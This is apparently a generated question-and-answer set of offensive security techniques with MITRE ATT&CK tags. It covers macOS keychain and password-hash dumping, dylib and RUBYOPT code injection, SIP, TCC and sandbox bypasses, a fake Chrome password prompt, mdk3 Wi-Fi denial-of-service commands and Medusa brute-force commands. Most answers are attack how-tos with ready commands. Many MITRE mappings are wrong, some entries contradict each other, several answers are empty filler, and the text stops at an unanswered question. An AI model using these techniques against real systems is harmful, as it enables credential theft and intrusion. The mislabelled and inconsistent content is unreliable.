## Q: What is the 'Pwning OTA' attack and how can it be used to compromise the macOS kernel?
A: The 'Pwning OTA' attack refers to vulnerabilities found in the macOS Over-the-Air (OTA) software updater that could be exploited to compromise the kernel. The report at [https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/] explains these vulnerabilities in detail, and a PoC is available at [https://github.com/jhftss/POC/tree/main/CVE-2022-46722]. These vulnerabilities could allow an attacker to gain kernel-level access by compromising the software updater. MITRE References: MITRE ID is TA0004, MITRE Name is: Privilege Escalation, and MITRE Tactics are: T1068, Exploitation for Privilege Escalation.

## Q: How can you dump all metadata and decrypted secrets from the macOS Keychain without generating prompts?
A: You can use the `security dump-keychain -a -d` command to dump all metadata and decrypted secrets from the macOS Keychain without generating prompts. This will allow you to see a lot of information about the keychain entries, including the decrypted secrets. MITRE References: MITRE ID is T1552, MITRE Name is: Unsecured Credentials, and MITRE Tactics are: TA0006.

## Q: How can you find the generic password for a specific account in the macOS Keychain?
A: You can use the `security find-generic-password -a "Slack" -g` command to find the generic password for the "Slack" account and print the secrets. MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: TA0006.

## Q: How can you find and abuse missing weak linked libraries in macOS applications?
A: You can use the `otool` command to find weak linked libraries in macOS binaries. Look for the `LC_LOAD_WEAK_DYLIB` command in the output. If a library is expected to be weakly linked, you can try to hijack it by placing a malicious library in the expected location. A tool like the Dylib Hijack Scanner can also be used to automate this process. MITRE References: MITRE ID is T1574.001, MITRE Name is: Hijack Execution Flow: DLL Search Order Hijacking, and MITRE Tactics are: TA0005, TA0003.

## Q: How can you abuse the `@rpath` feature in macOS to perform dylib hijacking?
A: Mach-O binaries can have the `LC_RPATH` and `LC_LOAD_DYLIB` commands. The `LC_RPATH` contains the paths of folders used to load libraries, and the `LC_LOAD_DYLIB` contains the path to specific libraries to load. If the `LC_LOAD_DYLIB` contains `@rpath`, it will be replaced by the values in `LC_RPATH`. You can try to place a malicious library in one of the `LC_RPATH` folders to hijack the library load. MITRE References: MITRE ID is T1574.001, MITRE Name is: Hijack Execution Flow: DLL Search Order Hijacking, and MITRE Tactics are: TA0005, TA0003.

## Q: How can you abuse `dlopen()` to perform library hijacking on macOS?
A: When the `dlopen()` function is used without a full path, it will search for the library in various locations, including `$DYLD_LIBRARY_PATH`, `LC_RPATH`, and the current working directory (if the process is unrestricted). You can try to place a malicious library in one of these locations to hijack the library load. MITRE References: MITRE ID is T1574.001, MITRE Name is: Hijack Execution Flow: DLL Search Order Hijacking, and MITRE Tactics are: TA0005, TA0003.

## Q: How can you perform relative path hijacking on macOS?
A: If a privileged binary or application (like a SUID or a binary with powerful entitlements) is loading a relative path library (using `@executable_path` or `@loader_path`) and has Library Validation disabled, you could move the binary to a location where you can modify the relative path loaded library and abuse it to inject code into the process. MITRE References: MITRE ID is T1574.001, MITRE Name is: Hijack Execution Flow: DLL Search Order Hijacking, and MITRE Tactics are: TA0005, TA0003.

## Q: How can you abuse Perl dependencies to execute arbitrary code?
A: You can list the dependencies folder order of Perl using the command `perl -e 'print join("\n", @INC)'`. This will return a list of folders, some of which may not even exist. The folder `/Library/Perl/5.30` does exist and is not protected by SIP, so you could create a malicious module in that folder that a high-privilege Perl script would load, allowing you to execute arbitrary code. However, you would need to be root to write in that folder, and you may also get a TCC prompt. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you exploit the PID Reuse vulnerability on macOS?
A: The exploit typically has two parts:

1. One that generates several forks
2. Each fork will send the payload to the XPC service while executing `posix_spawn` just after sending the message.

To make the exploit work, you need to either `export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES` or add the following code:

```asm(".section __DATA,__objc_fork_ok\n""empty:\n"".no_dead_strip empty\n");```

This allows the `fork()` to work between `exec()` calls. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you create an exploit using the NSTask approach for PID Reuse on macOS?
A: You can use the `NSTask` approach to exploit the PID Reuse vulnerability on macOS. The key steps are:1. Fork multiple child processes using `NSTask`.2. In each child process, send the malicious XPC message to the vulnerable service.3. Immediately after sending the message, execute `posix_spawn` to launch the target binary.4. The XPC service will authenticate the child process based on the PID, which will now belong to the target binary, even though the malicious message was sent before.To make this work, you need to disable the `OBJC_DISABLE_INITIALIZE_FORK_SAFETY` setting or add the following code:```asm(".section __DATA,__objc_fork_ok\n""empty:\n"".no_dead_strip empty\n");``` MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you create an exploit using the `fork()` approach for PID Reuse on macOS?
A: You can also use the `fork()` approach to exploit the PID Reuse vulnerability on macOS. The key steps are:1. Create a `hard_link` file and set its execution permissions.2. Start a thread that continuously overwrites the `hard_link` file, alternating between the contents of the legitimate binary and your payload.3. In the main process, create multiple child processes using `fork()`.4. In each child process, connect to the vulnerable XPC service and call the vulnerable function.5. Immediately after calling the XPC function, execute `posix_spawn` to launch the legitimate binary, which will now own the PID.6. The XPC service will authenticate the child process based on the PID, which will now belong to the legitimate binary, even though the malicious message was sent before.This approach exploits both the PID Reuse vulnerability and a race condition in the signature verification process. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you hijack the sudo command on macOS?
A: You can hijack the `sudo` command by modifying the `PATH` environment variable. Since macOS maintains the user's `PATH` when executing `sudo`, you can hijack other binaries that the victim will execute when running `sudo`. For example, you can create a malicious `ls` binary in `/opt/homebrew/bin` (a common location for Homebrew binaries) and the victim will run your malicious script when executing `sudo ls`. MITRE References: MITRE ID is T1546.015, MITRE Name is: Sudo and Sudo Caching, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you impersonate the Google Chrome application on macOS to perform privilege escalation?
A: You can create a fake Google Chrome application in the `/tmp` directory and add it to the Dock to impersonate the real Google Chrome application. The fake application can display a prompt asking the user for their password, which will then be saved to the `/tmp/passwd.txt` file. This technique relies on social engineering to trick the user into entering their password. MITRE References: MITRE ID is T1036.005, MITRE Name is: Masquerading: Rename System Utilities, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use the `mount_apfs` command to escalate privileges on macOS?
A: You can use the `mount_apfs` command to mount a Time Machine snapshot and access all the files within that snapshot, even if you are an unprivileged user. The only requirement is that the application used (like `Terminal`) has been granted Full Disk Access (FDA) permission, which can be done by an administrator. By mounting the snapshot with the `noowners` option, you can access all the files in the snapshot as the current user. MITRE References: MITRE ID is T1548.003, MITRE Name is: Abuse Elevation Control Mechanism: Sudo and Sudo Caching, and MITRE Tactics are: Privilege Escalation.

## Q: What sensitive locations on macOS can be useful for privilege escalation?
A: There are several sensitive locations on macOS that can be useful for privilege escalation, such as `/etc/pam.d`, `/Library/Security/SecurityAgentPlugins/`, and `/Library/Application Support/com.apple.TCC/TCC.db`. These locations contain system files and configuration that, if modified, can be used to escalate privileges. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can Library Injection be used to perform malicious activities on macOS?
A: Library Injection is a technique where an attacker forces a process to load a malicious library. Once injected, the library runs in the context of the target process, providing the attacker with the same permissions and access as the process. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: What is Function Hooking and how can it be used to gain control over a macOS process?
A: Function Hooking involves intercepting function calls or messages within a software code. By hooking functions, an attacker can modify the behavior of a process, observe sensitive data, or even gain control over the execution flow. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can Chromium be used to perform a man-in-the-browser attack on macOS?
A: It's possible to use the flags `--load-extension` and `--use-fake-ui-for-media-stream` to perform a man-in-the-browser attack on macOS, allowing an attacker to steal keystrokes, traffic, cookies, and inject scripts into pages. MITRE References: MITRE ID is T1556, MITRE Name is: Modification of Authentication Process, and MITRE Tactics are: Defense Evasion, Credential Access.

## Q: What is a Dirty NIB and how can it be used to execute arbitrary commands on macOS?
A: NIB files define user interface (UI) elements and their interactions within an application. However, they can execute arbitrary commands, and Gatekeeper doesn't stop an already executed application from being executed if a NIB file is modified. Therefore, they could be used to make arbitrary programs execute arbitrary commands. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: Persistence, Privilege Escalation, Defense Evasion.

## Q: What are the ways to inject code into .NET applications on macOS?
A: It's possible to inject code into .NET applications by abusing the .NET debugging functionality (not protected by macOS protections such as runtime hardening). MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can Perl scripts be used to execute arbitrary code on macOS?
A: Check different options to make a Perl script execute arbitrary code. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: What are the ways to abuse Ruby environment variables to execute arbitrary code on macOS?
A: It's also possible to abuse Ruby environment variables to make arbitrary scripts execute arbitrary code. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can Python be used to execute arbitrary code on macOS?
A: If the environment variable `PYTHONINSPECT` is set, the Python process will drop into a Python CLI once it's finished. It's also possible to use `PYTHONSTARTUP` to indicate a Python script to execute at the beginning of an interactive session. However, note that `PYTHONSTARTUP` script won't be executed when `PYTHONINSPECT` creates the interactive session. Other environment variables such as `PYTHONPATH` and `PYTHONHOME` could also be useful to make a Python command execute arbitrary code. Additionally, hijacking the Python installation in a writable location (e.g., Homebrew) can be used to execute arbitrary code when running Python. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can an attacker use the JAMF MDM to steal secrets?
A: Attackers could monitor the location `/Library/Application Support/Jamf/tmp/` for custom scripts that admins might want to execute via Jamf, as these scripts might contain credentials. They could also monitor `ps aux | grep -i jamf` to look for credentials passed as parameters to these scripts. MITRE References: MITRE ID is T1552, MITRE Name is: Unsecured Credentials, and MITRE Tactics are: TA0006.

## Q: How can the RUBYOPT environment variable be used to inject code into Ruby applications?
A: Using the RUBYOPT environment variable, it's possible to add new parameters to Ruby whenever it gets executed. Although the `-e` parameter cannot be used to specify Ruby code to execute, the `-I` and `-r` parameters can be used to add a new folder to the libraries to load path and then specify a library to load. For example, create the `inject.rb` library in `/tmp` with the contents `puts `whoami`` and then run an arbitrary Ruby script like `hello.rb` with `RUBYOPT="-I/tmp -rinject" ruby hello.rb`. This will execute the code in the `inject.rb` library when the `hello.rb` script is run. This technique can be used to inject code into Ruby applications. MITRE References: MITRE ID is T1112, MITRE Name is: Modify Registry, and MITRE Tactics are: TA0005, Defense Evasion.

## Q: How can you bypass the quarantine attribute to escape the macOS sandbox?
A: Files created by sandboxed processes are appended the quarantine attribute to prevent sandbox escaped. However, if you manage to create an `.app` folder without the quarantine attribute within a sandboxed application, you could make the app bundle binary point to `/bin/bash` and add some env variables in the plist to abuse `open` to launch the new app unsandboxed. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: How can you abuse the 'open' functionality to bypass the macOS sandbox?
A: The `open` CLI functionality could be abused to bypass the sandbox. For example, if a sandboxed application can create a file or folder with a `.app` extension, it can then use `open` to launch that `.app` bundle unsandboxed. MITRE References: MITRE ID is T1216, MITRE Name is: Trusted Developer Utilities Abuse, and MITRE Tactics are: Defense Evasion, Execution.

## Q: How can you use Launch Agents/Daemons to bypass the macOS sandbox?
A: Even if an application is meant to be sandboxed (`com.apple.security.app-sandbox`), it's possible to bypass the sandbox if it's executed from a LaunchAgent (`~/Library/LaunchAgents`) for example. You could make the sandboxed application be automatically executed as a LaunchAgent and maybe inject malicious code via DyLib environment variables to gain persistence. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you use Auto Start locations to bypass the macOS sandbox?
A: If a sandboxed process can write in a place where later an unsandboxed application is going to run the binary, it will be able to escape just by placing there the binary. Good examples of these locations are `~/Library/LaunchAgents` or `/System/Library/LaunchDaemons`. You might even need 2 steps: To make a process with a more permissive sandbox (`file-read*`, `file-write*`) execute your code which will actually write in a place where it will be executed unsandboxed. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you use process abuse to bypass the macOS sandbox?
A: If from the sandbox process you are able to compromise other processes running in less restrictive sandboxes (or none), you will be able to escape to their sandboxes. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you use static compiling and dynamic linking to bypass the macOS sandbox?
A: Because the sandbox is applied from userland when the `libSystem` library is loaded, if a binary could avoid loading it, it would never get sandboxed. This can be achieved by either completely statically compiling the binary, or by the binary not needing to load any libraries (because the linker is also in `libSystem`). MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can you use interposing to bypass the macOS sandbox?
A: You can interpose the `_libsecinit_initializer` function to prevent the sandbox from being initialized, or interpose the `__mac_syscall` function to bypass the sandbox initiation. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use lldb to debug and bypass the macOS sandbox?
A: You can use lldb to set breakpoints at key functions like `xpc_pipe_routine` and `__mac_syscall` to understand how the sandbox is loaded and then bypass it by modifying the registers and jumping to the desired location to avoid the sandbox checks. MITRE References: MITRE ID is T1073, MITRE Name is: Software Packing, and MITRE Tactics are: Defense Evasion.

## Q: How can macOS users be leveraged for privilege escalation?
A: To understand how macOS users can be leveraged for privilege escalation, you should learn about the common macOS users and their permissions. This information can be found on the [page about macOS Users](/macos-hardening/macos-security-and-privilege-escalation/macos-users). MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0006.

## Q: How can TCC (Transparency, Consent, and Control) privileges be escalated or bypassed on macOS?
A: Applications and binaries on macOS can have permissions to access folders or settings that make them more privileged than others. An attacker will need to escalate TCC privileges or bypass System Integrity Protection (SIP) to successfully compromise a macOS machine. You can find different ways to escalate privileges in TCC, bypass TCC, and bypass SIP on the [page about macOS TCC and SIP](/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc). MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: TA0004.

## Q: How can traditional privilege escalation be performed on macOS?
A: From a red team perspective, you should also be interested in escalating to root. You can find hints and information about traditional macOS privilege escalation on the [page about macOS Privilege Escalation](/macos-hardening/macos-security-and-privilege-escalation/macos-privilege-escalation). MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0004.

## Q: How can you bypass the macOS Background Task Management (BTM) security feature?
A: There are a few ways to bypass the BTM security feature on macOS:

1. **Resetting the database**: Running the `sfltool resettbtm` command as root will reset the BTM database, but for some reason, no new persistence will be alerted until the system is rebooted.

2. **Stopping the BTM Agent**: You can stop the BTM Agent process by finding its PID with `pgrep BackgroundTaskManagementAgent` and then sending it a SIGSTOP signal with `kill -SIGSTOP <PID>`.

3. **Bug**: If the process that created the persistence exits quickly, the BTM daemon will fail to get information about it and won't be able to send the event indicating a new persistence. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you dump all the information about users, including hash info, on macOS?
A: The following oneliner can be used to dump **all the information about the users** (including hash info):

```
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can you dump the passwords decrypted from the macOS keychain?
A: Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.

```
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
``` MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can you use the kcpassword file to recover a user's login password on macOS?
A: The **kcpassword** file is a file that holds the **user's login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file `**/etc/kcpassword**` xored with the key `**0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F**`. If the users password is longer than the key, the key will be reused.
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d). MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can the fsck_cs utility be used to bypass SIP on macOS?
A: A vulnerability was identified where `fsck_cs` was misled into corrupting a crucial file, the `/System/Library/Extensions/AppleKextExcludeList.kext/Contents/Info.plist`, due to its ability to follow symbolic links. Attackers can craft a link from `/dev/diskX` to this file, and then execute `fsck_cs /dev/diskX` to corrupt the file, compromising the SIP's ability to manage kernel exclusions. MITRE References: MITRE ID is T1548.003, MITRE Name is: Abuse Elevation Control Mechanism: Sudo and Sudo Caching, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can mounting a new file system over SIP-protected folders be used to bypass SIP on macOS?
A: It was possible to mount a new file system over SIP-protected folders to bypass the protection. The commands to do this are:

```
mkdir evil
# Add content to the folder
hdiutil create -srcfolder evil evil.dmg
hdiutil attach -mountpoint /System/Library/Snadbox/ evil.dmg
``` MITRE References: MITRE ID is T1548.003, MITRE Name is: Abuse Elevation Control Mechanism: Sudo and Sudo Caching, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can the upgrader bypass technique from 2016 be used to bypass SIP on macOS?
A: The upgrader bypass technique from 2016 involves altering the upgrade image (`InstallESD.dmg`) before booting, by substituting a dynamic loader (dyld) with a malicious version (`libBaseIA.dylib`). This results in the execution of the attacker's code when the installer is initiated, allowing them to gain control during the upgrade process and exploit the system's trust in the installer. MITRE References: MITRE ID is T1543.004, MITRE Name is: Create or Modify System Process: Launch Daemon, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can the `com.apple.rootless.install` entitlement be used to bypass SIP on macOS?
A: The entitlement `com.apple.rootless.install` is known to bypass System Integrity Protection (SIP) on macOS. This was notably mentioned in relation to CVE-2022-26712, where the system XPC service located at `/System/Library/PrivateFrameworks/ShoveService.framework/Versions/A/XPCServices/SystemShoveService.xpc` possesses this entitlement, allowing the related process to circumvent SIP constraints. MITRE References: MITRE ID is T1548.003, MITRE Name is: Abuse Elevation Control Mechanism: Sudo and Sudo Caching, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What are some ways to bypass TCC protections and escalate privileges on macOS?
A: Potential TCC bypasses include:- Inserting entries directly into the TCC databases if you can obtain write access - Abusing Automation/AppleScript permissions over Finder to access restricted folders and modify the TCC databases- Leveraging Accessibility permissions to send keystrokes and control other applications- Using 'kTCCServiceEndpointSecurityClient' to gain Full Disk Access- Exploiting SIP bypasses to modify protected TCC-related files like the AllowApplicationsList.plistThese techniques can allow an attacker to escalate privileges and gain control over sensitive system resources. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can an attacker abuse the `SQLITE_SQLLOG_DIR` environment variable to bypass TCC?
A: The `SQLITE_SQLLOG_DIR` environment variable can be abused to write inside a SQLite database that is going to be opened by a process with Full Disk Access, the TCC database. An attacker can use a symlink in the filename so when that database is opened, the user's TCC.db is overwritten. This technique is described in CVE-2023-32422. MITRE References: MITRE ID is T1112, MITRE Name is: Modify Registry, and MITRE Tactics are: TA0003, TA0004.

## Q: How can an attacker abuse the `MTL_DUMP_PIPELINES_TO_JSON_FILE` environment variable to bypass TCC?
A: The `MTL_DUMP_PIPELINES_TO_JSON_FILE` environment variable is used by the Metal framework, which is a dependency of various programs, most notably Music, which has Full Disk Access. Setting this environment variable to point to a path an attacker controls can lead to a race condition that can be exploited to overwrite the user's TCC.db file. This technique is described in CVE-2023-32407. MITRE References: MITRE ID is T1112, MITRE Name is: Modify Registry, and MITRE Tactics are: TA0003, TA0004.

## Q: How can an attacker abuse the `SQLITE_AUTO_TRACE` environment variable to bypass TCC?
A: If the `SQLITE_AUTO_TRACE` environment variable is set, the `libsqlite3.dylib` library will start logging all the SQL queries. Many applications used this library to access TCC protected information, so an attacker can set this environment variable to log and potentially abuse the TCC permissions granted to those applications. MITRE References: MITRE ID is T1112, MITRE Name is: Modify Registry, and MITRE Tactics are: TA0003, TA0004.

## Q: How can an attacker abuse process injection techniques to bypass TCC?
A: Attackers can inject code into processes that have TCC privileges through techniques like loading plugins or libraries. This allows the injected code to execute under the context of the privileged process and bypass TCC restrictions. Examples of this can be found in CVE-2020-27937, CVE-2020-29621, and CVE-2023-26818. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, TA0005.

## Q: How can you achieve full control over the target process after establishing shared memory and gaining arbitrary execution capabilities?
A: Upon successfully establishing shared memory and gaining arbitrary execution capabilities, you can achieve full control over the target process. The key functionalities enabling this control are:

1. **Arbitrary Memory Operations**:
   - Perform arbitrary memory reads by invoking `memcpy()` to copy data from the shared region.
   - Execute arbitrary memory writes by using `memcpy()` to transfer data to the shared region.
2. **Handling Function Calls with Multiple Arguments**:
   - For functions requiring more than 8 arguments, arrange the additional arguments on the stack in compliance with the calling convention.
3. **Mach Port Transfer**:
   - Transfer Mach ports between tasks through Mach messages via previously established ports.
4. **File Descriptor Transfer**:
   - Transfer file descriptors between processes using fileports, a technique highlighted by Ian Beer in `triple_fetch`. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can Maltego-Teeth be used to automate scans and attacks against web applications?
A: Maltego-Teeth can be used to integrate nmap, sqlmap, and other security tools into the Maltego framework. This allows you to perform automated reconnaissance, vulnerability scanning, and exploitation of web applications directly within the Maltego interface. For example, you can use the 'SQLInjectionScan' transform to scan a web page for SQL injection vulnerabilities using sqlmap. The version of Maltego-Teeth is 1.0+20201218-0kali3. MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Discovery.

## Q: How can Maryam be used for web reconnaissance and information gathering?
A: Maryam can be used for web reconnaissance and information gathering using its various modules. For example, you can use the 'search' module to search for information related to a target domain across different search engines and sources. The 'osint' module can be used to gather open-source intelligence about a target, such as finding email addresses, subdomains, and social media profiles. The 'web' module provides functionality for web scraping, URL extraction, and content analysis. Maryam version 2.5.0 includes these capabilities and more to help with information gathering and reconnaissance. MITRE References: MITRE ID is T1592, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Information Gathering.

## Q: How can Maryam be used for social media reconnaissance and OSINT gathering?
A: Maryam's 'osint' module provides functionality for gathering open-source intelligence (OSINT) from social media platforms. You can use the 'osint.email' function to search for email addresses associated with a target, the 'osint.username' function to search for usernames across different social media sites, and the 'osint.profile' function to gather information from social media profiles. Maryam version 2.5.0 also includes the 'osint.google' function to search Google for information related to a target. These OSINT capabilities in Maryam can be useful for reconnaissance and information gathering on individuals or organizations. MITRE References: MITRE ID is T1592, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Information Gathering.

## Q: How can you use mdk3 to perform a beacon flood attack?
A: To perform a beacon flood attack using mdk3 version 6.0-8, you can run the following command:

root@kali:~# mdk3 wlan0 b

This will send beacon frames to create fake APs, which can sometimes crash network scanners and even drivers. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Execution, Persistence, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration.

## Q: How can you use mdk3 to conduct an authentication DoS attack?
A: To perform an authentication DoS attack using mdk3 version 6.0-8, you can run the following command:

root@kali:~# mdk3 wlan0 a

This will send authentication frames to all APs found in range, which can freeze or reset some APs if too many clients are connected. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How can you use mdk3 to perform a deauthentication/disassociation attack?
A: To kick everyone found from an AP using mdk3 version 6.0-8, you can run the following command:

root@kali:~# mdk3 wlan0 d

This will send deauthentication and disassociation packets to all connected clients, effectively kicking them off the network. MITRE References: MITRE ID is T1485, MITRE Name is: Data Destruction, and MITRE Tactics are: Impact.

## Q: How can you use mdk3 to perform a WPA TKIP Denial-of-Service attack?
A: To exploit the TKIP Denial-of-Service vulnerability using mdk3 version 6.0-8, you can run the following command:

root@kali:~# mdk3 wlan0 m

This will continuously cancel all traffic to trigger the TKIP vulnerability and disrupt network communications. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How can Medusa be used to perform password guessing attacks against web applications?
A: Medusa can be used to brute-force login credentials for web applications by using the 'http' module. For example, to test a login page at http://example.com/login.php with a username list in users.txt and a password list in passwords.txt, you can run the following command:

medusa -h http://example.com -u FILE:users.txt -p FILE:passwords.txt -M http

This will test each combination of username and password against the login page. Medusa supports various options to customize the attack, such as setting the number of concurrent connections, retries, and more. Version 2.2 is used in this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can Medusa be used to perform password guessing attacks against SSH servers?
A: Medusa can be used to brute-force SSH login credentials by using the 'ssh' module. For example, to test SSH connections to the host 192.168.1.100 with a username list in users.txt and a password list in passwords.txt, you can run the following command:

medusa -h 192.168.1.100 -u FILE:users.txt -p FILE:passwords.txt -M ssh

This will test each combination of username and password against the SSH server. Medusa supports various options to customize the attack, such as setting the number of concurrent connections, retries, and more. Version 2.2 is used in this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can Medusa be used to perform password guessing attacks against FTP servers?
A: Medusa can be used to brute-force FTP login credentials by using the 'ftp' module. For example, to test FTP connections to the host 192.168.1.100 with a username list in users.txt and a password list in passwords.txt, you can run the following command:

medusa -h 192.168.1.100 -u FILE:users.txt -p FILE:passwords.txt -M ftp

This will test each combination of username and password against the FTP server. Medusa supports various options to customize the attack, such as setting the number of concurrent connections, retries, and more. Version 2.2 is used in this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can Mercurial be used to backdoor a target system?
A: Mercurial can be leveraged to establish persistence on a target system through the use of its built-in web server feature (hg serve). By running `hg serve --web-conf config.txt` on the attacker's machine and configuring the `config.txt` file to listen on a specific port and provide a web interface, the attacker can create a hidden web server on the target system. This can be used to establish a covert communication channel or host malicious content. However, this would require the attacker to already have code execution on the target system, so it is more of an afterthought rather than a primary vector of attack. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can Merlin evade detection by security products?
A: Merlin uses HTTP/2 for command and control communications, which can help bypass network security controls. Additionally, Merlin supports JA3 fingerprinting to mimic TLS/SSL traffic of benign applications. Version 1.5.1 also includes a Donut module that can be used to obfuscate Merlin agent payloads. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can Merlin be used to establish persistence on a compromised system?
A: Merlin supports various persistence mechanisms, including scheduled tasks, services, and registry modifications. With version 1.5.1, the agent can be configured to automatically start and reconnect to the C2 server, allowing for long-term access to the compromised system. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Persistence.

## Q: How can metagoofil v1.2.0 be used to gather information about a target company?
A: Metagoofil v1.2.0 is an information gathering tool that can be used to extract metadata from public documents belonging to a target company. The tool performs a Google search to identify and download documents in common file formats like PDF, DOC, XLS, and PPT. You can use metagoofil with the following command to search for and download up to 25 PDF files from the kali.org domain, saving the results to a directory named 'kalipdf' and a file named 'kalipdf.html':

root@kali:~# metagoofil -d kali.org -t pdf -l 100 -n 25 -o kalipdf -f kalipdf.html

This will allow you to gather potentially sensitive information about the target organization that may be present in the downloaded documents. MITRE References: MITRE ID is T1217, MITRE Name is: Browser Session Hijacking, and MITRE Tactics are: Discovery, Credential Access.

## Q: How can metagoofil v1.2.0 be used to gather information about an organization's file servers or cloud storage?
A: Metagoofil v1.2.0 can be used to search for and download public documents from a target organization, which may contain information about their file servers, cloud storage, or other internal infrastructure. By specifying the '-t' option to search for common file types like PDF, DOC, XLS, and PPT, you can attempt to locate and download documents that may contain sensitive details about the organization's IT systems and services. For example, the command:

root@kali:~# metagoofil -d example.com -t pdf,doc,xls,ppt -l 500 -n 100 -o exampledocs -f exampledocs.html

would search Google for up to 500 results on the example.com domain, download the first 100 documents of the specified file types, and save the links and downloaded files. This information could then be analyzed for potentially valuable details about the target organization's infrastructure. MITRE References: MITRE ID is T1213, MITRE Name is: Data from Information Repositories, and MITRE Tactics are: Discovery, Collection.

## Q: How can metagoofil v1.2.0 be used to perform social engineering attacks against a target organization?
